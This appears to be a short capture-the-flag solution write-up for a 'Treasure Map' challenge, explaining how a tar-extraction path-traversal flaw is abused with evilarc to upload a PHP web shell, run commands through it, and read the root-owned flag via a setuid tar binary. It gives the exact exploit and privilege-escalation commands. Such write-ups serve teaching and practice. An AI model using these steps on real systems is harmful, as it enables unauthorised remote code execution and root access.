# Solution to the Treasure Map challange

- You can notice that the `tarfile` library is vulnarable to a zipslip , you can use a tool like `evilarc` to exploit it and upload an rce
ex : `python evilarc.py cmd.php  -f mal.tar.gz -p ../../../../../../var/www/html -d 0 -o unix`
- after uploading the rce you can test it by running linux commands like `http://your_url/cmd?x=ls` 
- we can then notice that the flag is inside the root directory so we need to figure out a way to access it , you can find at the end of the dockerfile `RUN chmod +s /bin/tar` meaning we can run the tar command as root
- after some research you can find that you can create an archive out of the /root directory (`tar --create tar.tar /root`)
- you will notice that the flag will be printed at the end of the output
